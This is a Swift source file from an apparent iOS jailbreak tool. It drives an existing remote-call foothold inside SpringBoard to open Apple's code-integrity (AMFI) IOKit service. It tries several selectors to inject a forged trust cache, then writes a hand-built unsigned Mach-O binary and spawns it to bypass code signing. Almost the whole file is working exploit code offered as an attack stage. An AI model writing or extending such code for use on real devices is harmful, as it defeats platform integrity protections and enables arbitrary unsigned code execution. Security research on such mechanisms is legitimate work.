//
//  exp_springboard_tc_load.swift
//  DSPloit
//
//  Load trust cache via SpringBoard RC (ALREADY CONNECTED, no timeout)
//  Uses the existing SpringBoard RemoteCall that's proven working.
//

import Foundation
import CommonCrypto

final class ExpSpringBoardTCLoad {
    static let shared = ExpSpringBoardTCLoad()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_sb_tc) \(msg)")
    }
    
    func runAsync() {
        #if !DISABLE_REMOTECALL
        let mgr = dspmgr.shared
        
        guard mgr.dsready else { log("❌ KRW not active"); return }
        guard mgr.rcready, let sb = mgr.sbProc else { log("❌ SpringBoard RC not connected"); return }
        
        log("── SpringBoard TC Load ──")
        log("Using EXISTING SpringBoard RC (no new connection needed)")
        log("")
        
        // Step 1: Build files
        log("[1/3] Building TC + binary...")
        let testBin = buildBinary()
        let cdhash = sha256t20(testBin)
        let tcData = buildTC(cdhash: cdhash)
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/sb_test_bin"
        let tcPath = docs + "/sb_tc.bin"
        
        do {
            try testBin.write(to: URL(fileURLWithPath: binPath))
            try tcData.write(to: URL(fileURLWithPath: tcPath))
            log("✅ Files written")
        } catch {
            log("❌ \(error.localizedDescription)")
            return
        }
        
        // Step 2: Use SpringBoard RC to probe IOKit + load TC
        log("")
        log("[2/3] IOKit via SpringBoard RC...")
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Get IOKit function addresses from SpringBoard
        let ioMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioGetMatch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioCall = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
        let taskSelfPtr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "mach_task_self_"))
        
        log("IOServiceMatching: 0x\(String(ioMatching, radix: 16))")
        log("IOServiceGetMatchingService: 0x\(String(ioGetMatch, radix: 16))")
        log("IOServiceOpen: 0x\(String(ioOpen, radix: 16))")
        log("IOConnectCallStructMethod: 0x\(String(ioCall, radix: 16))")
        
        guard ioMatching != 0 && ioGetMatch != 0 && ioOpen != 0 && ioCall != 0 else {
            log("❌ IOKit functions not found in SpringBoard")
            return
        }
        log("✅ All IOKit functions found")
        log("")
        
        // IOServiceMatching("AppleMobileFileIntegrity")
        // NOTE: IOServiceMatching takes const char* and returns CFMutableDictionaryRef
        // The string must be in remote process memory
        let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matching = RootExecutor.rcallAddr(sb, ioMatching, amfiStr)
        log("IOServiceMatching → 0x\(String(matching, radix: 16))")
        
        guard matching != 0 && matching != 0xDEAD else {
            log("❌ Matching dict is NULL/invalid")
            RootExecutor.rcall(sb, "free", amfiStr)
            return
        }
        
        // IOServiceGetMatchingService(kIOMainPortDefault=0, matching)
        // NOTE: matching dict is consumed by this call (CFRelease'd internally)
        let service = RootExecutor.rcallAddr(sb, ioGetMatch, 0, matching)
        log("AMFI service → 0x\(String(service, radix: 16))")
        
        guard service != 0 else {
            log("❌ AMFI service not found")
            return
        }
        log("✅ AMFI IOKit service found!")
        
        // Get mach_task_self
        var taskSelf: UInt64 = 0x103
        if taskSelfPtr != 0 {
            let val = sb[taskSelfPtr].value32()
            if val != 0 { taskSelf = UInt64(val) }
        }
        log("task_self = 0x\(String(taskSelf, radix: 16))")
        
        // IOServiceOpen
        let connAddr = sb.trojanMem + 0x2800
        sb[connAddr].setValue32(0)
        let kr = RootExecutor.rcallAddr(sb, ioOpen, service, taskSelf, 0, connAddr)
        let conn = sb[connAddr].value32()
        log("IOServiceOpen → kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))")
        
        if kr != 0 || conn == 0 {
            log("❌ Cannot open AMFI (kr=0x\(String(kr, radix: 16)))")
            log("   SpringBoard may lack IOKit entitlement for AMFI")
            log("")
            log("   Trying alternative: direct posix_spawn test...")
            testSpawn(sb: sb, binPath: binPath)
            return
        }
        
        log("✅ AMFI IOKit connection opened!")
        log("")
        
        // Write TC data to SpringBoard memory
        let tcBuf = sb.trojanMem + 0x3000
        tcData.withUnsafeBytes { buf in
            sb.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
        }
        
        let outBuf = sb.trojanMem + 0x4000
        let outSizeAddr = sb.trojanMem + 0x4800
        
        // Try IOConnectCallStructMethod with selectors 0-7
        log("Trying IOKit selectors...")
        var foundSel = false
        for sel: UInt32 in 0..<8 {
            sb[outSizeAddr].setValue64(256)
            let callKr = RootExecutor.rcallAddr(sb, ioCall,
                UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
            
            let migBadId: UInt64 = 0xe00002c2
            if callKr == 0 {
                log("✅ Selector \(sel) → SUCCESS!")
                foundSel = true
                break
            } else if callKr != migBadId {
                log("   sel \(sel) → 0x\(String(callKr, radix: 16))")
            }
        }
        
        if !foundSel {
            log("⚠️ No selector accepted TC data directly")
            log("   AMFI IOKit may need different input format")
        }
        
        // Step 3: Test spawn regardless
        log("")
        log("[3/3] Testing unsigned spawn...")
        testSpawn(sb: sb, binPath: binPath)
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    #if !DISABLE_REMOTECALL
    private func testSpawn(sb: RemoteCall, binPath: String) {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let mem = sb.trojanMem
        
        // chmod 755
        let pathAddr = remote_alloc_str(sb, binPath)
        let chmodSym = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "chmod"))
        if chmodSym != 0 {
            RootExecutor.rcallAddr(sb, chmodSym, pathAddr, 0o755)
        }
        
        // posix_spawn
        let spawnSym = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "posix_spawn"))
        guard spawnSym != 0 else {
            log("❌ posix_spawn not found")
            RootExecutor.rcall(sb, "free", pathAddr)
            return
        }
        
        let pidAddr = mem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = mem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcallAddr(sb, spawnSym, pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn → ret=\(ret) pid=\(pid)")
        
        if ret == 0 && pid != 0 {
            log("")
            log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(pid)")
            log("🎉 FULL JAILBREAK ACHIEVED!")
        } else {
            log("❌ Spawn failed (AMFI still blocking)")
            log("   ret=\(ret) = EPERM (Operation not permitted)")
            log("   Trust cache not loaded or wrong CDHash")
        }
    }
    #endif
    
    // MARK: - Helpers
    
    private func sha256t20(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
    
    private func buildTC(cdhash: Data) -> Data {
        var tc = Data()
        var v: UInt32 = 2; tc.append(Data(bytes: &v, count: 4))
        var uuid = UUID().uuid; tc.append(Data(bytes: &uuid, count: 16))
        var c: UInt32 = 1; tc.append(Data(bytes: &c, count: 4))
        tc.append(cdhash)
        tc.append(contentsOf: [2, 0, 0, 0])
        return tc
    }
    
    private func buildBinary() -> Data {
        var bin = Data()
        bin.append(contentsOf: [0xCF,0xFA,0xED,0xFE,0x0C,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x60,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0]=0x19;seg[4]=0x48;seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28]=0x01;seg[32]=0x00;seg[33]=0x40;seg[40]=0x00;seg[41]=0x40;seg[48]=0x05;seg[52]=0x05
        bin.append(contentsOf: seg)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44;thr[272]=0x80;thr[273]=0x01;thr[276]=0x01
        bin.append(contentsOf: thr)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00,0x00,0x80,0xD2,0x30,0x00,0x80,0xD2,0x01,0x10,0x00,0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
